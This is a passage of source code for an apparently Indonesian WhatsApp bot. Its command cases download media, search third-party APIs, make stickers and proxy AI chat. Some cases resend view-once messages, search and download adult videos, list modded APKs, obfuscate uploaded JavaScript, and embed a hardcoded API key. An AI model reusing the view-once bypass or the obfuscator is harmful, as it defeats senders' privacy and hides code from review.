}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "play": {
if (!text) return m.reply(example("dj tiktok"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp3(res.url)
if (anu.audio) {
let urlMp3 = anu.audio
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playspotify": case "plays": case "playsp": {
if (!text) return m.reply(example("intro ariana"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})

var anu = await fetchJson("https://restapi.simplebot.my.id/api/download/playspotify?q="+text)

if (anu.result.download.link) {
let urlMp3 = anu.result.download.link
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: anu.result.metadata.cover_url, title: anu.result.metadata.title, body: `Author ${anu.result.metadata.artists} || Duration ${anu.result.metadata.duration}`, sourceUrl: anu.result.metadata.link, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp4(res.url)
if (anu.video) {
let urlMp3 = anu.video
await conn.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sfile": {
if (!text) return m.reply(example('script bot whatsapp'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/sfile?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Link :* ${res.link}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "xnxx": {
if (!text) return m.reply(example('step sister'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/xnxx?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Info :* ${res.info}
* *Link :* ${res.link}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "npm": case "npmsearch": {
if (!text) return m.reply(example('axios'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/npm?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* ${res.title}
* ${res.update.split("T")[0]}
* ${res.links.npm}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playstore": {
if (!text) return m.reply(example('alight motion'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/playstore?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.nama}
* *Developer :* ${res.developer}
* *Rating :* ${res.rate}
* *Link :* ${res.link}\n\n`
}
await m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gimage": {
if (!text) return m.reply(example("anime dark"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pint = await fetchJson(`https://restapi-v2.simplebot.my.id/search/gimage?q=${text}`)
let pin = pint.result
if (pin.length > 5) await pin.splice(0, 6)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
try {
let imgsc = await prepareWAMessageMedia({ image: {url: a.url}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
} catch {}
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *google*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
var anu = await ytmp3(text)
if (anu.audio) {
let urlMp3 = anu.audio
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "block")
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
var anu = await ytmp4(text)
if (anu.video) {
let urlMp3 = anu.video
await conn.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": case "ttaudio": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "spotify": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi.simplebot.my.id/api/download/spotify?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.result}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await fetchJson(`https://restapi-v2.simplebot.my.id/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.url}\n`
}
m.reply(teks)
conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/instagram?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
if (res.result.downloadUrls.length > 1) {
for (let i of res.result.downloadUrls) {
await conn.sendMessage(m.chat, {image: {url: i}, caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
} else {
await conn.sendMessage(m.chat, {video: {url: res.result.downloadUrls[0]}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "doodstream": case "dood": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
try {
let res = await Buddy(`${text}`)
await conn.sendMessage(m.chat, {video: {url: res.response.gif.url}, mimetype: "video/mp4", caption: "*Doodstream Downloader ✅*"}, {quoted: m})
} catch (err) {
console.log(err)
m.reply("Error result not found")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "terabox": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/terabox?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {document: {url: res.result}, mimetype: "application/zip", fileName: "Terabox.zip", caption: "*Terabox Downloader ✅*"}, {quoted: m})

}).catch((e) => m.reply("Error link tautan tidak didukung"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "facebook": case "fb": case "fbdl": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/facebook?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
return conn.sendMessage(m.chat, {video: {url: res.result.media.video_hd || res.result.media.video_sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.videoUrl}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "xnxxdl": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/xnxx?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.files.hight || res.result.files.low}, mimetype: "video/mp4", caption: "*XNXX Downloader ✅*"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "googledrive": case "gdrive": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply(example("linknya"))
try {
    const res = await fetchJson(`https://restapi-v2.simplebot.my.id/download/gdrive?url=${text}`)
   await conn.sendMessage(m.chat, { document: { url: res.result.downloadUrl }, mimetype: res.result.mimetype, fileName: `${res.result.fileName}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! result tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await conn.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var data = await fetchJson(`https://restapi-v2.simplebot.my.id/tools/ssweb?url=${text}`)
await conn.sendMessage(m.chat, { image: { url: data.result.iurl}, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enc": case "encrypt": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply file .js"))
if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard": case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*ZarStore/*^/*($break)*/" + 
            "/*ZarStore/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await conn.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = ` *── List all group chat*\n`
let a = await conn.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://rest-api-v3-beta.vercel.app/ai/openai?text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deepseek": case "depsek": case "deepsek": {
let talk = text ? text : "Hallo Kamu Siapa ?"
await fetchJson("https://restapi-v2.simplebot.my.id/ai/deepseek?text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "brat": {
if (!text) return m.reply(example('teksnya'))
let brat = `https://restapi-v2.simplebot.my.id/imagecreator/brat?text=${text}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {

}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bratvid":  case "bratvideo": {
if (!text) return m.reply(example('teksnya'))
try {
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "emojigif": {
if (!text) return m.reply(example('😍'))
try {
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await conn.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl": case "tourl2": {
if (!/image|video/.test(mime)) return m.reply(example("dengan reply foto/vidio"))
async function dt (buffer) {
  const fetchModule = await import('node-fetch');
  const fetch = fetchModule.default
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");
  let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
  });
  let data = await res.text();
  return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
await conn.sendMessage(m.chat, {text: `*Url :* ${dd}\n*Expired :* Permanen`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "readqr": {
if (!/image|video/.test(mime)) return m.reply(example("dengan reply qris"))
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            reject(error);
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await conn.sendMessage(m.chat, {text: `*Data :*\n${dd}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
